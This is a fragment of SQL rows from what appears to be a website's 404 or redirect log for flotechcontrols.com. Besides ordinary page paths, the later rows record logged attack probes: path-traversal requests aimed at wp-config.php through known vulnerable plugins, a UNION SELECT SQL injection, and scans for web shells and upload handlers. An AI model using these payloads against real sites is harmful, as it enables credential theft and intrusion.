(1786, 'http://flotechcontrols.com/application-sectors/mining/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:49:11', '0000-00-00 00:00:00'),
(1787, 'http://flotechcontrols.com/application-sectors/mining/contact-us', '', '', '', 1, 0, '2015-01-24 18:49:12', '0000-00-00 00:00:00'),
(1788, 'http://flotechcontrols.com/application-sectors/oil-and-gas/about-us', '', '', '', 1, 0, '2015-01-24 18:49:15', '0000-00-00 00:00:00'),
(1789, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:49:16', '0000-00-00 00:00:00'),
(1790, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:49:16', '0000-00-00 00:00:00'),
(1791, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/wey', '', '', '', 1, 0, '2015-01-24 18:49:17', '0000-00-00 00:00:00'),
(1792, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/noreva', '', '', '', 1, 0, '2015-01-24 18:49:18', '0000-00-00 00:00:00'),
(1793, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:49:18', '0000-00-00 00:00:00'),
(1794, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/birkett', '', '', '', 1, 0, '2015-01-24 18:49:19', '0000-00-00 00:00:00'),
(1795, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/sor', '', '', '', 1, 0, '2015-01-24 18:49:19', '0000-00-00 00:00:00'),
(1796, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/mts', '', '', '', 1, 0, '2015-01-24 18:49:20', '0000-00-00 00:00:00'),
(1797, 'http://flotechcontrols.com/application-sectors/oil-and-gas/products/copes', '', '', '', 1, 0, '2015-01-24 18:49:20', '0000-00-00 00:00:00'),
(1798, 'http://flotechcontrols.com/application-sectors/oil-and-gas/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:49:21', '0000-00-00 00:00:00'),
(1799, 'http://flotechcontrols.com/application-sectors/oil-and-gas/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:49:22', '0000-00-00 00:00:00'),
(1800, 'http://flotechcontrols.com/application-sectors/oil-and-gas/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:49:22', '0000-00-00 00:00:00'),
(1801, 'http://flotechcontrols.com/application-sectors/oil-and-gas/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:49:23', '0000-00-00 00:00:00'),
(1802, 'http://flotechcontrols.com/application-sectors/oil-and-gas/contact-us', '', '', '', 1, 0, '2015-01-24 18:49:23', '0000-00-00 00:00:00'),
(1803, 'http://flotechcontrols.com/contact-us/about-us', '', '', '', 1, 0, '2015-01-24 18:49:27', '0000-00-00 00:00:00'),
(1804, 'http://flotechcontrols.com/contact-us/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:49:27', '0000-00-00 00:00:00'),
(1805, 'http://flotechcontrols.com/contact-us/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:49:28', '0000-00-00 00:00:00'),
(1806, 'http://flotechcontrols.com/contact-us/products/wey', '', '', '', 1, 0, '2015-01-24 18:49:28', '0000-00-00 00:00:00'),
(1807, 'http://flotechcontrols.com/contact-us/products/noreva', '', '', '', 1, 0, '2015-01-24 18:49:29', '0000-00-00 00:00:00'),
(1808, 'http://flotechcontrols.com/contact-us/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:49:30', '0000-00-00 00:00:00'),
(1809, 'http://flotechcontrols.com/contact-us/products/birkett', '', '', '', 1, 0, '2015-01-24 18:49:30', '0000-00-00 00:00:00'),
(1810, 'http://flotechcontrols.com/contact-us/products/sor', '', '', '', 1, 0, '2015-01-24 18:49:31', '0000-00-00 00:00:00'),
(1811, 'http://flotechcontrols.com/contact-us/products/mts', '', '', '', 1, 0, '2015-01-24 18:49:31', '0000-00-00 00:00:00'),
(1812, 'http://flotechcontrols.com/contact-us/products/copes', '', '', '', 1, 0, '2015-01-24 18:49:32', '0000-00-00 00:00:00'),
(1813, 'http://flotechcontrols.com/contact-us/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:49:32', '0000-00-00 00:00:00'),
(1814, 'http://flotechcontrols.com/contact-us/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:49:33', '0000-00-00 00:00:00'),
(1815, 'http://flotechcontrols.com/contact-us/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:49:34', '0000-00-00 00:00:00'),
(1816, 'http://flotechcontrols.com/contact-us/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:49:34', '0000-00-00 00:00:00'),
(1817, 'http://flotechcontrols.com/contact-us/contact-us', '', '', '', 1, 0, '2015-01-24 18:49:35', '0000-00-00 00:00:00'),
(1818, 'http://flotechcontrols.com/wp-content/plugins/revslider/temp/update_extract/revslider/cache.php', '', '', '', 1, 0, '2015-01-29 11:25:06', '0000-00-00 00:00:00'),
(1819, 'http://www.flotechcontrols.com/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', '', '', '', 1, 0, '2015-01-29 23:26:10', '0000-00-00 00:00:00'),
(1820, 'http://flotechcontrols.com/libraries/phputf8/utils/reader.php', '', '', '', 1, 0, '2015-01-30 14:58:00', '0000-00-00 00:00:00'),
(1821, 'http://www.flotechcontrols.com/wp-admin/admin-ajax.php?150130-173514', '', '', '', 1, 0, '2015-01-30 17:35:15', '0000-00-00 00:00:00'),
(1822, 'http://flotechcontrols.com/components/com_weblinks/metadata.php', '', '', '', 1, 0, '2015-01-31 03:01:13', '0000-00-00 00:00:00'),
(1823, 'http://flotechcontrols.com/images/systemcash.php', '', '', '', 1, 0, '2015-01-31 03:32:03', '0000-00-00 00:00:00'),
(1824, 'http://www.flotechcontrols.com/wp-content/themes/infocus/lib/scripts/dl-skin.php', '', 'http://www.flotechcontrols.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', '', 1, 0, '2015-02-02 22:41:20', '0000-00-00 00:00:00'),
(1825, 'http://www.flotechcontrols.com/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php', '', 'http://www.flotechcontrols.com/wp-content/themes/infocus/lib/scripts/dl-skin.php', '', 1, 0, '2015-02-02 22:41:21', '0000-00-00 00:00:00'),
(1826, 'http://www.flotechcontrols.com/wp-content/themes/awake/lib/scripts/dl-skin.php', '', 'http://www.flotechcontrols.com/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php', '', 1, 0, '2015-02-02 22:41:23', '0000-00-00 00:00:00'),
(1827, 'http://www.flotechcontrols.com/wp-content/themes/echelon/lib/scripts/dl-skin.php', '', 'http://www.flotechcontrols.com/wp-content/themes/awake/lib/scripts/dl-skin.php', '', 1, 0, '2015-02-02 22:41:30', '0000-00-00 00:00:00'),
(1828, 'http://www.flotechcontrols.com/wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php', '', 'http://www.flotechcontrols.com/wp-content/themes/echelon/lib/scripts/dl-skin.php', '', 1, 0, '2015-02-02 22:41:43', '0000-00-00 00:00:00'),
(1829, 'http://www.flotechcontrols.com/wp-content/themes/dejavu/lib/scripts/dl-skin.php', '', 'http://www.flotechcontrols.com/wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php', '', 1, 0, '2015-02-02 22:41:45', '0000-00-00 00:00:00'),
(1830, 'http://www.flotechcontrols.com/wp-content/themes/elegance/lib/scripts/dl-skin.php', '', 'http://www.flotechcontrols.com/wp-content/themes/dejavu/lib/scripts/dl-skin.php', '', 1, 0, '2015-02-02 22:41:47', '0000-00-00 00:00:00'),
(1831, 'http://www.flotechcontrols.com/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php', '', 'http://www.flotechcontrols.com/wp-content/themes/elegance/lib/scripts/dl-skin.php', '', 1, 0, '2015-02-02 22:41:49', '0000-00-00 00:00:00'),
(1832, 'http://flotechcontrols.com/modules/mod_ariimageslider/mod_ariimageslider.php', '', '', '', 1, 0, '2015-02-03 04:45:34', '0000-00-00 00:00:00'),
(1833, 'http://flotechcontrols.com/images/js.php', '', '', '', 1, 0, '2015-02-03 05:11:58', '0000-00-00 00:00:00'),
(1834, 'http://flotechcontrols.com/modules/mod_stop/mod_stop.php', '', '', '', 1, 0, '2015-02-03 05:13:29', '0000-00-00 00:00:00'),
(1835, 'http://flotechcontrols.com/modules/mod_enrola/mod_enrola.php', '', '', '', 1, 0, '2015-02-03 05:17:34', '0000-00-00 00:00:00'),
(1836, 'http://flotechcontrols.com/images/config.php', '', '', '', 1, 0, '2015-02-04 02:33:09', '0000-00-00 00:00:00'),
(1837, 'http://flotechcontrols.com/components/com_content/models/tmpls.php', '', '', '', 1, 0, '2015-02-05 05:18:14', '0000-00-00 00:00:00'),
(1838, 'http://www.flotechcontrols.com/+', '', '', '', 1, 0, '2015-02-06 21:58:01', '0000-00-00 00:00:00'),
(1839, 'http://flotechcontrols.com/xmlrpc.php?rsd=1', '', '', '', 1, 0, '2015-02-08 01:54:12', '0000-00-00 00:00:00'),
(1840, 'http://flotechcontrols.com/media/cacheplugin.php', '', '', '', 1, 0, '2015-02-09 01:12:29', '0000-00-00 00:00:00'),
(1841, 'http://flotechcontrols.com/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', '', '', '', 1, 0, '2015-02-09 04:22:41', '0000-00-00 00:00:00'),
(1842, 'http://flotechcontrols.com/tmp/cacheplugin.php', '', '', '', 1, 0, '2015-02-09 07:54:57', '0000-00-00 00:00:00'),
(1843, 'http://flotechcontrols.com/components/com_creativecontactform/helpers/helper.php', '', '', '', 1, 0, '2015-02-09 13:26:50', '0000-00-00 00:00:00'),
(1844, 'http://flotechcontrols.com/images/cacheplugin.php', '', '', '', 1, 0, '2015-02-12 14:18:30', '0000-00-00 00:00:00'),
(1845, 'http://flotechcontrols.com/media/sfx.php', '', '', '', 1, 0, '2015-02-12 15:15:25', '0000-00-00 00:00:00'),
(1846, 'http://www.flotechcontrols.com/section/wp-login.php', '', '', '', 1, 0, '2015-02-13 13:08:21', '0000-00-00 00:00:00'),
(1847, 'http://www.flotechcontrols.com/admin/wp-login.php', '', '', '', 1, 0, '2015-02-13 13:08:22', '0000-00-00 00:00:00'),
(1848, 'http://www.flotechcontrols.com/wp-login/', '', '', '', 1, 0, '2015-02-13 13:08:26', '0000-00-00 00:00:00'),
(1849, 'http://flotechcontrols.com/plugins/captcha/wo.php', '', '', '', 1, 0, '2015-02-15 13:09:59', '0000-00-00 00:00:00'),
(1850, 'http://www.flotechcontrols.com/x.php', '', '', '', 1, 0, '2015-02-16 03:46:02', '0000-00-00 00:00:00'),
(1851, 'http://flotechcontrols.com/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-02-17 15:32:31', '0000-00-00 00:00:00'),
(1852, 'http://flotechcontrols.com/components/com_facileforms/libraries/jquery/uploadify.php', '', '', '', 1, 0, '2015-02-17 15:32:32', '0000-00-00 00:00:00'),
(1853, 'http://flotechcontrols.com/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-02-17 15:32:33', '0000-00-00 00:00:00'),
(1854, 'http://flotechcontrols.com/modules/mod_artuploader/upload.php', '', '', '', 1, 0, '2015-02-17 15:32:34', '0000-00-00 00:00:00'),
(1855, 'http://flotechcontrols.com/modules/mod_dionefileuploader/upload.php', '', '', '', 1, 0, '2015-02-17 15:32:36', '0000-00-00 00:00:00'),
(1856, 'http://flotechcontrols.com/mambots/editors/wysiwygpro/document.php', '', '', '', 1, 0, '2015-02-17 15:32:37', '0000-00-00 00:00:00'),
(1857, 'http://flotechcontrols.com/index.php/weblinks-categories?id=0%20%29%20union%20select%20concat_ws%280x3A,12,56%29%20--%20%29', '', '', '', 1, 0, '2015-02-17 21:02:18', '0000-00-00 00:00:00'),
(1858, 'http://www.flotechcontrols.com/images/xxu.php', '', '', '', 1, 0, '2015-02-20 06:08:22', '0000-00-00 00:00:00'),
(1859, 'http://flotechcontrols.com/customer/account/login', '', 'http://flotechcontrols.com/customer/account/login', '', 1, 0, '2015-02-21 07:03:03', '0000-00-00 00:00:00'),
(1860, 'http://www.flotechcontrols.com/ntigfavicon.ico/.php', '', '', '', 1, 0, '2015-02-27 07:46:39', '0000-00-00 00:00:00'),
(1861, 'http://www.flotechcontrols.com/favicon.ico/.php', '', '', '', 1, 0, '2015-02-27 07:46:39', '0000-00-00 00:00:00'),
(1862, 'http://flotechcontrols.com/modules/mod_dbrestore/db.php', '', 'http://flotechcontrols.com/modules/mod_dbrestore/db.php', '', 1, 0, '2015-03-01 03:48:03', '0000-00-00 00:00:00'),
(1863, 'http://flotechcontrols.com/modules/mod_mapsgoogle/mod_mapsgoogle.php', '', 'http://flotechcontrols.com/modules/mod_mapsgoogle/mod_mapsgoogle.php', '', 1, 0, '2015-03-01 03:48:03', '0000-00-00 00:00:00'),
(1864, 'http://flotechcontrols.com/modules/mod_tools/mod_tools.php', '', 'http://flotechcontrols.com/modules/mod_tools/mod_tools.php', '', 1, 0, '2015-03-01 03:48:03', '0000-00-00 00:00:00'),
(1865, 'http://flotechcontrols.com/images/pack.php', '', 'http://flotechcontrols.com/images/pack.php', '', 1, 0, '2015-03-01 03:48:03', '0000-00-00 00:00:00'),
(1866, 'http://flotechcontrols.com/administrator/img.php', '', 'http://flotechcontrols.com/administrator/img.php', '', 1, 0, '2015-03-01 03:48:04', '0000-00-00 00:00:00'),
(1867, 'http://flotechcontrols.com/modules/mod_beflate/mod_beflate.php', '', 'http://flotechcontrols.com/modules/mod_beflate/mod_beflate.php', '', 1, 0, '2015-03-01 03:48:04', '0000-00-00 00:00:00'),
(1868, 'http://flotechcontrols.com/modules/mod_te/mod_te.php', '', 'http://flotechcontrols.com/modules/mod_te/mod_te.php', '', 1, 0, '2015-03-01 03:48:04', '0000-00-00 00:00:00'),
(1869, 'http://flotechcontrols.com/modules/mod_googlemapapi/mod_googlemapapi.php', '', 'http://flotechcontrols.com/modules/mod_googlemapapi/mod_googlemapapi.php', '', 1, 0, '2015-03-01 03:48:06', '0000-00-00 00:00:00'),
(1870, 'http://flotechcontrols.com/tmp/phplogs.php', '', 'http://flotechcontrols.com/tmp/phplogs.php', '', 1, 0, '2015-03-01 03:48:07', '0000-00-00 00:00:00'),
(1871, 'http://flotechcontrols.com/modules/mod_linkbiz/mod_linkbiz.php', '', 'http://flotechcontrols.com/modules/mod_linkbiz/mod_linkbiz.php', '', 1, 0, '2015-03-01 03:48:10', '0000-00-00 00:00:00'),
(1872, 'http://flotechcontrols.com/images/wp-conf.php', '', 'http://flotechcontrols.com/images/wp-conf.php', '', 1, 0, '2015-03-01 03:48:10', '0000-00-00 00:00:00'),
(1873, 'http://flotechcontrols.com/modules/mod_xsystemx/mod_xsystemx.php', '', 'http://flotechcontrols.com/modules/mod_xsystemx/mod_xsystemx.php', '', 1, 0, '2015-03-01 03:48:12', '0000-00-00 00:00:00'),
(1874, 'http://flotechcontrols.com/modules/mod_sape/mod_sape.php', '', 'http://flotechcontrols.com/modules/mod_sape/mod_sape.php', '', 1, 0, '2015-03-01 03:48:28', '0000-00-00 00:00:00'),
(1875, 'http://www.flotechcontrols.com/customer/account/login', '', 'http://www.flotechcontrols.com/customer/account/login', '', 1, 0, '2015-03-02 01:53:03', '0000-00-00 00:00:00'),
(1876, 'http://flotechcontrols.com/tmp/temp.php', '', '', '', 1, 0, '2015-03-02 09:44:05', '0000-00-00 00:00:00'),
(1877, 'http://flotechcontrols.com/sqlite/main.php', '', '', '', 1, 0, '2015-03-05 16:49:58', '0000-00-00 00:00:00'),
(1878, 'http://flotechcontrols.com/auth/hybridauth/install.php', '', '', '', 1, 0, '2015-03-05 16:49:59', '0000-00-00 00:00:00'),
(1879, 'http://flotechcontrols.com/hybridauth/install.php', '', '', '', 1, 0, '2015-03-05 16:50:00', '0000-00-00 00:00:00'),
(1880, 'http://flotechcontrols.com/hybridauth/hybridauth/install.php', '', '', '', 1, 0, '2015-03-05 16:50:01', '0000-00-00 00:00:00'),
(1881, 'http://flotechcontrols.com/bigdump/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:01', '0000-00-00 00:00:00'),
(1882, 'http://flotechcontrols.com/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:02', '0000-00-00 00:00:00'),
(1883, 'http://flotechcontrols.com/dump/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:03', '0000-00-00 00:00:00'),
(1884, 'http://flotechcontrols.com/admin/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:04', '0000-00-00 00:00:00'),
(1885, 'http://flotechcontrols.com/admin/dump/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:05', '0000-00-00 00:00:00'),
(1886, 'http://flotechcontrols.com/backup/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:05', '0000-00-00 00:00:00'),
(1887, 'http://flotechcontrols.com/backup/bigdump/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:06', '0000-00-00 00:00:00'),
(1888, 'http://flotechcontrols.com/dump/bigdump/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:07', '0000-00-00 00:00:00'),
(1889, 'http://flotechcontrols.com/bd/bigdump/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:08', '0000-00-00 00:00:00'),
(1890, 'http://flotechcontrols.com/database/bigdump/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:09', '0000-00-00 00:00:00'),
(1891, 'http://flotechcontrols.com/mysql/bigdump/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:10', '0000-00-00 00:00:00'),
(1892, 'http://flotechcontrols.com/mysql/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:10', '0000-00-00 00:00:00'),
(1893, 'http://flotechcontrols.com/db/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:11', '0000-00-00 00:00:00'),
(1894, 'http://flotechcontrols.com/database/bigdump.php', '', '', '', 1, 0, '2015-03-05 16:50:12', '0000-00-00 00:00:00'),
(1895, 'http://flotechcontrols.com/lib/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:50:53', '0000-00-00 00:00:00'),
(1896, 'http://flotechcontrols.com/include/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:50:53', '0000-00-00 00:00:00'),
(1897, 'http://flotechcontrols.com/admin/editor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:50:55', '0000-00-00 00:00:00'),
(1898, 'http://flotechcontrols.com/admin/fck/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:50:56', '0000-00-00 00:00:00'),
(1899, 'http://flotechcontrols.com/editor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:50:57', '0000-00-00 00:00:00'),
(1900, 'http://flotechcontrols.com/public/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:50:58', '0000-00-00 00:00:00'),
(1901, 'http://flotechcontrols.com/app/webroot/js/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:50:59', '0000-00-00 00:00:00'),
(1902, 'http://flotechcontrols.com/cms/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:51:01', '0000-00-00 00:00:00'),
(1903, 'http://flotechcontrols.com/admin/js/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:51:01', '0000-00-00 00:00:00'),
(1904, 'http://flotechcontrols.com/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:51:02', '0000-00-00 00:00:00'),
(1905, 'http://flotechcontrols.com/manage/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:51:03', '0000-00-00 00:00:00'),
(1906, 'http://flotechcontrols.com/system/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:51:04', '0000-00-00 00:00:00'),
(1907, 'http://flotechcontrols.com/plugins/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:51:05', '0000-00-00 00:00:00'),
(1908, 'http://flotechcontrols.com/webadmin/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:51:06', '0000-00-00 00:00:00'),
(1909, 'http://flotechcontrols.com/manager/fckeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2015-03-05 16:51:06', '0000-00-00 00:00:00'),
(1910, 'http://flotechcontrols.com/piwik/libs/open-flash-chart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:07', '0000-00-00 00:00:00'),
(1911, 'http://flotechcontrols.com/sites/all/modules/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:08', '0000-00-00 00:00:00'),
(1912, 'http://flotechcontrols.com/js/ofc2/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:09', '0000-00-00 00:00:00'),
(1913, 'http://flotechcontrols.com/ofc/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:09', '0000-00-00 00:00:00'),
(1914, 'http://flotechcontrols.com/openemr/library/openflashchart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:10', '0000-00-00 00:00:00'),
(1915, 'http://flotechcontrols.com/sites/default/modules/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:11', '0000-00-00 00:00:00'),
(1916, 'http://flotechcontrols.com/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:12', '0000-00-00 00:00:00'),
(1917, 'http://flotechcontrols.com/includes/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:13', '0000-00-00 00:00:00'),
(1918, 'http://flotechcontrols.com/openflashchart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:13', '0000-00-00 00:00:00'),
(1919, 'http://flotechcontrols.com/stats/libs/open-flash-chart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:14', '0000-00-00 00:00:00'),
(1920, 'http://flotechcontrols.com/modules/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:15', '0000-00-00 00:00:00'),
(1921, 'http://flotechcontrols.com/openemr-4.1.1/library/openflashchart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:16', '0000-00-00 00:00:00'),
(1922, 'http://flotechcontrols.com/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:17', '0000-00-00 00:00:00'),
(1923, 'http://flotechcontrols.com/libs/open-flash-chart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:17', '0000-00-00 00:00:00'),
(1924, 'http://flotechcontrols.com/admin_area/charts/ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:18', '0000-00-00 00:00:00'),
(1925, 'http://flotechcontrols.com/ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2015-03-05 16:51:19', '0000-00-00 00:00:00'),
(1926, 'http://flotechcontrols.com/administratorindex.php', '', 'flotechcontrols.com/administratorindex.php', '', 1, 0, '2015-03-06 19:05:17', '0000-00-00 00:00:00'),
(1927, 'http://flotechcontrols.com/modules/mod_feed/d.php', '', '', '', 1, 0, '2015-03-14 02:40:41', '0000-00-00 00:00:00'),
(1928, 'http://flotechcontrols.com/components/com_datsogallery/sub_votepic.php?id=1&user_rating=1', '', '', '', 1, 0, '2015-03-14 13:02:32', '0000-00-00 00:00:00'),
(1929, 'http://flotechcontrols.com/oledit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1930, 'http://flotechcontrols.com/texteditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1931, 'http://flotechcontrols.com/admin/texteditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1932, 'http://flotechcontrols.com/htmledit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1933, 'http://flotechcontrols.com/web_editor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1934, 'http://flotechcontrols.com/edit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1935, 'http://flotechcontrols.com/admin/ewebeditor1/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1936, 'http://flotechcontrols.com/system/webedit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1937, 'http://flotechcontrols.com/system/z_editor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1938, 'http://flotechcontrols.com/system/htmledit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1939, 'http://flotechcontrols.com/admin/z_editor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1940, 'http://flotechcontrols.com/admin/editor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1941, 'http://flotechcontrols.com/system/%23ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1942, 'http://flotechcontrols.com/admin/%23ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1943, 'http://flotechcontrols.com/admin/southidceditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1944, 'http://flotechcontrols.com/admin/ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1945, 'http://flotechcontrols.com/adminpage/edit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1946, 'http://flotechcontrols.com/web/ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1947, 'http://flotechcontrols.com/%23ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1948, 'http://flotechcontrols.com/inc/ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1949, 'http://flotechcontrols.com/scripts/ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1950, 'http://flotechcontrols.com/admin/webedit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1951, 'http://flotechcontrols.com/editor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1952, 'http://flotechcontrols.com/admin/web_editor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1953, 'http://flotechcontrols.com/webeditor', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1954, 'http://flotechcontrols.com/system/southidceditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1955, 'http://flotechcontrols.com/manage/ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1956, 'http://flotechcontrols.com/z_editor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1957, 'http://flotechcontrols.com/manage/webedit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1958, 'http://flotechcontrols.com/system/edit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1959, 'http://flotechcontrols.com/editors/ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1960, 'http://flotechcontrols.com/system/ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1961, 'http://flotechcontrols.com/admin/edit/', '', '', '', 1, 0, '2015-03-14 14:06:18', '0000-00-00 00:00:00'),
(1962, 'http://flotechcontrols.com/manage/htmledit/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1963, 'http://flotechcontrols.com/admin/htmledit/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1964, 'http://flotechcontrols.com/manage/editor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1965, 'http://flotechcontrols.com/admin/oledit/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1966, 'http://flotechcontrols.com/system/webeditor', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1967, 'http://flotechcontrols.com/system/web_editor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1968, 'http://flotechcontrols.com/jleditor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1969, 'http://flotechcontrols.com/manage/z_editor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
